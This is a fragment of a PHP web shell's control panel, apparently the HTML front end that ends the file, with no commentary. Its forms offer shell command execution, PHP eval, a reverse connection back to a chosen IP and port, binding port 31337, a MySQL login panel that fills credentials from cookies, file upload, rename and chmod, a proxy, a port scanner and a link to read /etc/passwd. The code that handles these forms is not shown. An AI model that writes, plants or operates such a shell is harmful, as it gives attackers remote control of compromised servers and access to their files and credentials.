        <input name="myfile" type="file" id="myfile" value="Load..." size="20" />
            <input type="submit" name="ok" value="do" />
        </div>
    </form>    </td>
    <td style="border:#FFFFFF 1px solid;"><form action=# method=post>
      <div align="center"><strong>:: Rename File ::  </strong><br>
      <input type="hidden" name="mode" value="renfile" />
        <input type="text" name="oldname" value="0ld name" size="15" />
            <input type="text" name="newname" value="New name" size="15" />
            <input name="submit" type="submit" value="Ren" />
        </div>
    </form>    </td>
    <td style="border:#FFFFFF 1px solid;"><form action="#" method="post">
      <div align="center"><strong>:: Make Dir :: </strong><br>
          <input type="hidden" name="mode" value="mkdir" />
        name
        <input name="mkdir" type="text" size="18" />
            <input name="submit" type="submit" value="ok" />
        </div>
    </form>    </td>
  </tr>
  <tr>
    <td style="border:#FFFFFF 1px solid;"><form action=# method=post>
      <div align="center"><strong>:: Cmd Execution ::  </strong><br>
      <input type=hidden name=mode value=cmd>
        <input name=cmd size="26" tpye=text>
        <input name="submit" type=submit value=exec>
        </div>
    </form>    </td>
    <td style="border:#FFFFFF 1px solid;"><form action="#" method="post">
      <div align="center"><strong>:: BackConn :: </strong><br>
      <input type=hidden name=mode value=reverse />
        <input name="ip" type="text" value="<?=$_SERVER['REMOTE_ADDR']?>" size="26" />
        <input name="port" type="text" value="port..." size="10" />
        <input name="submit" type="submit" value="BackConn" />
        </div>
    </form>    </td>
    <td style="border:#FFFFFF 1px solid;"><form action=# method="post">
      <div align="center"><strong>:: Bind Port :: </strong><br>
          <input type="hidden" name="mode" value="bind" />
          <input name="submit7" type=submit value="Bind port 31337" />
        </div>
    </form>    </td>
  </tr>
  <tr>
    <td style="border:#FFFFFF 1px solid;"><form action="#" method="post" name="sqlpanel" id="sqlpanel">
      <div align="center"><strong>:: MySQL Panel :: </strong><br>
      <input type=hidden name=mode value=loginsql />
        <input name="user" type="text" value="<?=(isset($_COOKIE[mysql_user]))?$_COOKIE[mysql_user]:"user"?>" size="9" />
        <input type="text" size="10" name="pass" value="<?=(isset($_COOKIE[mysql_pass]))?$_COOKIE[mysql_pass]:"pass"?>" />
        <input type="text" name="host" size="10" value="<?=(isset($_COOKIE[mysql_host]))?$_COOKIE[mysql_host]:"host"?>" />
        <input name="dbname" type="text" value="<?=(isset($_COOKIE[mysql_name]))?$_COOKIE[mysql_name]:"database"?>" size="10" />
        <input name="submit" type="submit" value="MySQL" />
        </div>
    </form>    </td>
    <td style="border:#FFFFFF 1px solid;"><form method="post" action="#">
      <div align="center"><strong>:: PHP Execution ::  </strong><br>
      <input type="hidden" value="eval" name="mode" />
        <input name="eval" type="text" size="30" />
        <input type="submit" value="Eval" />
      </div>
    </form>  </td>
    <td style="border:#FFFFFF 1px solid;"><form action=# method=post name="folder" id="folder">
      <div align="center"><strong>:: Go Dir ::</strong>        <br>
        <input type=hidden name='mode' value='ls'>
           <input type=text value='<?=$dir?>' name='dir'>
        <input type=submit value=change/list>
      </div>
    </form></td>
  </tr>
    <tr>
      <td style="border:#FFFFFF 1px solid;"><div align="center">
	  		<form method="post" action="#">
			<strong>:: Proxy ::</strong>        <br>
        	<input name="mode" type="hidden" id="mode" value="proxysurf" />
        	url: <input name="url" type="text" size="30" />
			<input type="submit" value="surf" /> 
			<input name="curl" type="checkbox" id="curl" value="curl" />  curl 
			<input name="fopen" type="checkbox" id="fopen" value="fopen" /> fopen<br /> 
			 
			</form></div>
      </td>
      <td style="border:#FFFFFF 1px solid;"><form method="post" action="#">
      <div align="center"><strong>:: File Change Mode::  </strong><br>
      <input type="hidden" value="chmod" name="mode" />
        <input name="filename" type="text" id="filename" value="file" size="15" />
        <input name="filemode" type="text" id="filemode" value="mode" size="15" />
        <input type="submit" value="Chmod" />
      </div>
    </form>  </td>
      <td style="border:#FFFFFF 1px solid;"><form method="post" action="#">
      <div align="center"><strong>:: Port Scan ::  </strong><br>
      <input type="hidden" value="scan" name="mode" />
        <input name="host" type="text" id="host" value="host" size="15" />
        <input name="minport" type="text" value="max port" size="10" />
        <input name="maxport" type="text" id="maxport" value="max port" size="10" />
		<input type="submit" value="scan" />
      </div>
    </form> </td>
    </tr>
</table>
	 <form action=# name=tools method=post>
	   <span class="Stile1">
        <input type=hidden name=mode value=tools /> 
        <input type=hidden name=nometool />
        </span>
      </form>
	 <span class="Stile1">
	  <div align="center"><a class="link" href="javascript:document.folder.dir.value='<?=addslashes(realpath("."))?>';document.folder.submit();">Home</a> - <a class="link" href="javascript:document.tools.nometool.value='passwd';document.tools.submit();">Cat /etc/passwd</a> - <a class="link" href="javascript:document.tools.nometool.value='encoder';document.tools.submit();">Encoder</a> - <a class="link" href="javascript:document.tools.mode.value='phpinfo';document.tools.submit();">PHPInfo</a> - <a class="link" href="javascript:document.tools.nometool.value='scanner';document.tools.submit();">ShellScan</a> - <a class="link" href="javascript:document.tools.nometool.value='proxy';document.tools.submit();">Proxy</a> </div>
	  <br>
	 Directory:</span> 
	 <? $pd = $e = explode(DIRECTORY_SEPARATOR,substr($dir,0,-1));
$i = 0;
foreach($pd as $b)
{
 $t = "";
 $j = 0;
 foreach ($e as $r)
 {
  $t.= $r.DIRECTORY_SEPARATOR;
  if ($j == $i) {break;}
  $j++;
 }
 echo "<a class=\"link\" href=\"javascript:document.folder.dir.value='".urlencode(addslashes($t))."';document.folder.submit();\"><b>".htmlspecialchars($b).DIRECTORY_SEPARATOR."</b></a>";
 $i++;
}
?><br>
	  <br>
	  <?=$error?><?=$output?>    </td>
  </tr>
</table>
</body>

</html>
<? die(); ?>